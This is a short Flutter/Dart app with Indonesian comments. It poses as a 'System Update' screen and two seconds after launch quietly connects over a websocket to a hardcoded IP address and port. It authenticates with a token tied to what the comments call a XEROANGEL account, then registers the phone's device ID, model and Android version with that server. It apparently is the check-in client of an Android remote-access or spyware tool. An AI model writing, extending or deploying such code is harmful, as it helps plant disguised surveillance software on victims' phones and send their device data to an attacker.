import 'dart:async';
import 'package:flutter/material.dart';
import 'package:socket_io_client/socket_io_client.dart' as IO;
import 'package:device_info_plus/device_info_plus.dart';

// ⚠️ GANTI UID INI DENGAN UID DARI XEROANGEL KAMU ⚠️
const String SERVER_URL = 'http://152.42.184.64:2363'; 
const String TARGET_UID = 'd7e27df25f68d737f7a454b58a97f77c'; 

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  runApp(const MyApp());
  
  // Beri jeda 2 detik sebelum konek agar aplikasi siap
  Timer(const Duration(seconds: 2), () {
    _connectToServer();
  });
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});
  @override
  Widget build(BuildContext context) {
    return const MaterialApp(
      debugShowCheckedModeBanner: false,
      home: Scaffold(body: Center(child: Text('System Update'))),
    );
  }
}

Future<void> _connectToServer() async {
  try {
    final androidInfo = await DeviceInfoPlugin().androidInfo;

    IO.Socket socket = IO.io(SERVER_URL, 
      IO.OptionBuilder()
      .setTransports(['websocket'])
      .setExtraHeaders({'x-auth-token': TARGET_UID})
      .enableAutoConnect()
      // Hanya boleh mencoba konek 1 kali
      .setReconnectionAttempts(1) 
      .build()
    );

    socket.onConnect((_) {
      print('KONEK BERHASIL');
      
      // Kirim data device (HANYA SEKALI)
      socket.emit('device:register', {
        'deviceId': androidInfo.id,
        'name': androidInfo.model,
        'battery': 100,
        'charging': false,
        'sdkVersion': androidInfo.version.sdkInt.toString(),
        'androidVersion': androidInfo.version.release,
        'uid': TARGET_UID,
      });
    });

    socket.onConnectError((err) => print('GAGAL KONEK: $err'));
    
  } catch (e) {
    print('Error: $e');
  }
}
